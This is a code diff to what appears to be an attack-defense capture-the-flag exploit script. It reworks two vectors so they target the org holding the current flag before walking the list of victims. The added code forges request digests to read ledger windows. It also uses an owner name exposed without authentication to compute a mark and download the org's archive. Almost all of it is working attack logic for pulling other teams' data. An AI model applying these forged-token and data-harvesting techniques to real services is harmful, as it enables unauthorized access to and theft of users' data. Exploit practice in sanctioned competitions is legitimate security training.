@@ -334,6 +334,20 @@ def _budget(timeout: float) -> float:
     return time.monotonic() + max(VECTOR_BUDGET, timeout * 4)
 
 
+def _hint_slug() -> str:
+    """The org slug the gameserver hands us, or "" when run without one.
+
+    donor's flag id IS the org holding this tick's flag, which makes the
+    campaign walk unnecessary for the row that actually scores. Worth querying
+    before enumeration, not after: campaign ids are already past
+    CAMPAIGN_WALK_CAP (c0000010e == 270), so the walk both misses the org AND
+    spends the whole VECTOR_BUDGET doing it, after which every `deadline`
+    check below short-circuits and no window is ever requested.
+    """
+    hint = os.environ.get("FARM_FLAGID", "")
+    return _clean(hint) if hint.startswith("org-") else ""
+
+
 # ------------------------------------------------------------------ vectors
 
 
@@ -347,10 +361,20 @@ def v_ledger_window(host, port, timeout=DEFAULT_TIMEOUT):
     if not _fingerprint(host, port, timeout):
         return []
     deadline = _budget(timeout)
-    slugs = _victims(host, port, timeout, deadline)
     probe = min(timeout, PROBE_TIMEOUT)
     found: list[str] = []
     covered: set[str] = set()
+
+    # Scoring row first, before the walk can spend the budget (see _hint_slug).
+    hint = _hint_slug()
+    if hint:
+        query = urlencode(org=hint, lane="", digest=_fold("%s:" % hint))
+        status, data = _get(host, port, "/api/ledger/window?%s" % query, probe)
+        if status == 200:
+            covered.add(hint)
+        found.extend(_notes(data, "entries"))
+
+    slugs = _victims(host, port, timeout, deadline)
 
     # Primary form: org-scoped window, lane empty -> fold("<slug>:").
     for slug in slugs:
@@ -392,10 +416,24 @@ def v_org_archive(host, port, timeout=DEFAULT_TIMEOUT):
     if not _fingerprint(host, port, timeout):
         return []
     deadline = _budget(timeout)
-    _victims(host, port, timeout, deadline)
-    state = _fill_owners(host, port, timeout, deadline)
     probe = min(timeout, PROBE_TIMEOUT)
     found: list[str] = []
+
+    # Same reasoning as chain A: two requests on the flag id's org before the
+    # walk, since `owner` is published unauthenticated by GET /api/orgs/:slug.
+    hint = _hint_slug()
+    if hint:
+        status, data = _get(host, port, "/api/orgs/%s" % _quote(hint), probe)
+        owner = data.get("owner") if isinstance(data, dict) else None
+        if isinstance(owner, str) and owner:
+            query = urlencode(mark=_fold("%s:%s" % (hint, owner)))
+            _s, archive = _get(
+                host, port, "/api/orgs/%s/archive?%s" % (_quote(hint), query), probe
+            )
+            found.extend(_notes(archive, "archive"))
+
+    _victims(host, port, timeout, deadline)
+    state = _fill_owners(host, port, timeout, deadline)
     for slug in sorted(state["orgs"])[:ORG_CAP]:
         owner = state["orgs"][slug]
         if not owner or time.monotonic() > deadline:
